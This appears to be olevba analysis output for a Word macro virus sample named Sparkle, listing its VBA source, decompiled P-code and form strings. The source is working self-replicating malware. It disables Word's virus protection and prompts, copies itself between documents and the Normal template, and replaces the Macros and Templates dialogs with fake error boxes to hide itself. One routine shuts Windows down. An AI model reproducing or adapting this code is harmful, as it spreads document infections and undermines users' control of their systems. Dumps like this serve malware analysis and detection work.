olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Sparkle
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Sparkle - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sparkle.bas 
in file: ./Virus.MSWord.Sparkle - OLE stream: 'Macros/VBA/Sparkle'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSave()
    On Error GoTo Error
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Sparkle" Then
            DocumentInstalled = True
        End If
        Next
    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Sparkle" Then
            GlobalInstalled = True
        End If
        Next
    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Sparkle", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="userform999", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="userform900", Object:=wdOrganizerObjectProjectItems
    With ActiveDocument
        .BuiltInDocumentProperties(wdPropertyTitle) = "SPARKLE97"
        .BuiltInDocumentProperties(wdPropertySubject) = "Word Macro Virri"
        .BuiltInDocumentProperties(wdPropertyAuthor) = "Talon 1997"
        .BuiltInDocumentProperties(wdPropertyManager) = "Talon 1997"
        .BuiltInDocumentProperties(wdPropertyCompany) = "Eifel Epidemic"
        .BuiltInDocumentProperties(wdPropertyComments) = "This Word Macro Virus Was Made By Talon"
         End With
        End If
    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Sparkle", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="userform999", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="userform900", Object:=wdOrganizerObjectProjectItems
        End If

Sparkle
Error:
End Sub
Sub Toolsmacro()
On Error GoTo Error
userform999.Show
Error:
End Sub
Sub Filetemplates()
On Error GoTo Error
userform900.Show
Error:
End Sub
Sub Sparkle()
On Error GoTo Error
If WeekDay(Now()) = 2 And Hour(Now()) = 9 Then
With ActiveDocument.Content
    .Font.Animation = wdAnimationSparkleText
Application.StatusBar = True
StatusBar = "Your Infected With The Word Macro Virus SPARKLE97, Talon"
Application.Caption = "Your Infected With The Word Macro Virus SPARKLE97, Talon"
End With
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
Error:
End Sub
Sub ViewVbCode()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Tasks.ExitWindows
End Sub
-------------------------------------------------------------------------------
VBA MACRO userform999.frm 
in file: ./Virus.MSWord.Sparkle - OLE stream: 'Macros/VBA/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub ListBox2_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform999
End Sub
Private Sub UserForm_Initialize()
    ComboBox1.AddItem "Normal.dot(global template)"
End Sub
Private Sub CommandButton2_Click()
Unload userform999
End Sub
Private Sub CommandButton5_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform999
End Sub
Private Sub UserForm_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform999
End Sub
-------------------------------------------------------------------------------
VBA MACRO userform900.frm 
in file: ./Virus.MSWord.Sparkle - OLE stream: 'Macros/VBA/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
Private Sub CommandButton2_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
Private Sub CommandButton3_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
Private Sub CommandButton4_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
Private Sub CommandButton5_Click()
Unload userform900
End Sub
Private Sub CommandButton6_Click()
Unload userform900
End Sub
Private Sub ListBox2_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
Private Sub ScrollBar1_Change()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
Private Sub UserForm_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Sparkle
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/Sparkle - 4380 bytes
' Line #0:
' 	FuncDefn (Sub FileSave())
' Line #1:
' 	OnError Error 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #3:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' Line #8:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #9:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Sparkle"
' 	Eq 
' 	IfBlock 
' Line #10:
' 	LitVarSpecial (True)
' 	St DocumentInstalled 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	StartForVariable 
' 	Next 
' Line #13:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #14:
' 	Ld J 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Sparkle"
' 	Eq 
' 	IfBlock 
' Line #15:
' 	LitVarSpecial (True)
' 	St GlobalInstalled 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	StartForVariable 
' 	Next 
' Line #18:
' 	Ld DocumentInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Sparkle"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #20:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "userform999"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #21:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "userform900"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #22:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #23:
' 	LitStr 0x0009 "SPARKLE97"
' 	Ld wdPropertyTitle 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #24:
' 	LitStr 0x0010 "Word Macro Virri"
' 	Ld wdPropertySubject 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #25:
' 	LitStr 0x000A "Talon 1997"
' 	Ld wdPropertyAuthor 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #26:
' 	LitStr 0x000A "Talon 1997"
' 	Ld wdPropertyManager 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #27:
' 	LitStr 0x000E "Eifel Epidemic"
' 	Ld wdPropertyCompany 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #28:
' 	LitStr 0x0027 "This Word Macro Virus Was Made By Talon"
' 	Ld wdPropertyComments 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #29:
' 	EndWith 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld GlobalInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Sparkle"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #33:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "userform999"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #34:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "userform900"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #35:
' 	EndIfBlock 
' Line #36:
' Line #37:
' 	ArgsCall Sparkle 0x0000 
' Line #38:
' 	Label Error 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub Toolsmacro())
' Line #41:
' 	OnError Error 
' Line #42:
' 	Ld userform999 
' 	ArgsMemCall Show 0x0000 
' Line #43:
' 	Label Error 
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Sub Filetemplates())
' Line #46:
' 	OnError Error 
' Line #47:
' 	Ld userform900 
' 	ArgsMemCall Show 0x0000 
' Line #48:
' 	Label Error 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Sub Sparkle())
' Line #51:
' 	OnError Error 
' Line #52:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #53:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	With 
' Line #54:
' 	Ld wdAnimationSparkleText 
' 	MemLdWith Font 
' 	MemSt Animation 
' Line #55:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt StatusBar 
' Line #56:
' 	LitStr 0x0038 "Your Infected With The Word Macro Virus SPARKLE97, Talon"
' 	St StatusBar 
' Line #57:
' 	LitStr 0x0038 "Your Infected With The Word Macro Virus SPARKLE97, Talon"
' 	Ld Application 
' 	MemSt Caption 
' Line #58:
' 	EndWith 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #61:
' 	Label Error 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub ViewVbCode())
' Line #64:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #65:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #66:
' 	EndSub 
' Macros/VBA/userform999 - 2440 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub ListBox2_Click())
' Line #3:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #4:
' 	Ld userform999 
' 	ArgsCall Unlock 0x0001 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #7:
' 	LitStr 0x001B "Normal.dot(global template)"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #10:
' 	Ld userform999 
' 	ArgsCall Unlock 0x0001 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #13:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #14:
' 	Ld userform999 
' 	ArgsCall Unlock 0x0001 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #17:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #18:
' 	Ld userform999 
' 	ArgsCall Unlock 0x0001 
' Line #19:
' 	EndSub 
' Macros/VBA/userform900 - 3412 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #3:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #4:
' 	Ld userform900 
' 	ArgsCall Unlock 0x0001 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #7:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #8:
' 	Ld userform900 
' 	ArgsCall Unlock 0x0001 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #11:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #12:
' 	Ld userform900 
' 	ArgsCall Unlock 0x0001 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #15:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #16:
' 	Ld userform900 
' 	ArgsCall Unlock 0x0001 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #19:
' 	Ld userform900 
' 	ArgsCall Unlock 0x0001 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Private Sub CommandButton6_Click())
' Line #22:
' 	Ld userform900 
' 	ArgsCall Unlock 0x0001 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Private Sub ListBox2_Click())
' Line #25:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #26:
' 	Ld userform900 
' 	ArgsCall Unlock 0x0001 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Private Sub ScrollBar1_Change())
' Line #29:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #30:
' 	Ld userform900 
' 	ArgsCall Unlock 0x0001 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #33:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #34:
' 	Ld userform900 
' 	ArgsCall Unlock 0x0001 
' Line #35:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Document templateD
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Attach...
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Automatically update document styles
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Global templates and add-ins�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Checked items are currently loaded.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Remove@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Full path:         C:\...MICROSOFT OFFICE\OFFICE\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Organizer
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancel@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macro Name:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macros in::
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancel@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Step Into
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Edit�	
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Create@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Delete@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Organizer...�	
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Description:�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
